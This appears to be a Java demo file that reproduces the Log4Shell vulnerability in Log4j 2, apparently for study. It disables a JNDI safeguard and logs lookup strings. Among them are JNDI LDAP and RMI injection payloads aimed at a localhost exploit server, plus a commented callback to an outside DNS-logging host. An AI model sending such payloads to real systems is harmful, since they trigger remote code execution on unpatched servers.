package Log4jRce;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Created by hfc on 2021/12/13.
 *
 * https://www.zhihu.com/question/505025655
 *
 * https://logging.apache.org/log4j/2.x/manual/lookups.html
 * https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution
 *
 */
public class Log4jDemo {

    private static final Logger logger = LogManager.getLogger(Log4jDemo.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");


        logger.error("--- start ---");
        logger.error("${lower:${java:version}}");
        logger.error("${java:hw}");
        logger.error("${jndi:ldap://127.0.0.1:10087/exploit}");
//        logger.error("${jndi:ldap://4p8b0s.dnslog.cn}");
        logger.error("${jndi:rmi://localhost:10087/exploit}");
//        logger.info("${jndi:rmi://localhost:10087/exploit}"); // error 级别，info 日志不打印不触发
    }

}
